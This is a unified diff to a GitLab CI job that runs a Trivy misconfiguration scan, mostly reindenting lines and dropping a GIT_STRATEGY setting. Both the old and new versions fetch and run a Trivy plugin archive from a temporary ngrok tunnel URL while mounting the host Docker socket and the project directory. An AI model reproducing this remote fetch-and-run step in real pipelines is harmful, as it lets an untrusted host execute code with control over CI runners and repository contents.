@@ -4,8 +4,6 @@ variables:
 
 trivy-misconfig_detection:
     stage: test
-    variables:
-        GIT_STRATEGY: none
     allow_failure: true
     artifacts:
         reports:
@@ -18,16 +16,16 @@ trivy-misconfig_detection:
 
             if [ -z "$CONTAINER_ID" ]; then
                 docker run --rm \
-                      -v /var/run/docker.sock:/var/run/docker.sock \
-                      -v ${CI_PROJECT_DIR}:/glproject \
-                      $TRIVY_IMAGE plugin run http://d8e0-64-225-69-54.ngrok-free.app/trivy-gitlab.tar.gz \
-                      misconfig /glproject -- --report-path="/glproject"
+                    -v /var/run/docker.sock:/var/run/docker.sock \
+                    -v ${CI_PROJECT_DIR}:/glproject \
+                    $TRIVY_IMAGE plugin run http://d8e0-64-225-69-54.ngrok-free.app/trivy-gitlab.tar.gz \
+                    misconfig /glproject -- --report-path="/glproject"
             else
-                  docker run --rm \
-                      -v /var/run/docker.sock:/var/run/docker.sock \
-                      --volumes-from ${CONTAINER_ID} \
-                      $TRIVY_IMAGE plugin run http://d8e0-64-225-69-54.ngrok-free.app/trivy-gitlab.tar.gz \
-                      misconfig $CI_PROJECT_DIR -- --report-path=${CI_PROJECT_DIR}
+                docker run --rm \
+                    -v /var/run/docker.sock:/var/run/docker.sock \
+                    --volumes-from ${CONTAINER_ID} \
+                    $TRIVY_IMAGE plugin run http://d8e0-64-225-69-54.ngrok-free.app/trivy-gitlab.tar.gz \
+                    misconfig $CI_PROJECT_DIR -- --report-path=${CI_PROJECT_DIR}
             fi
 
     rules:
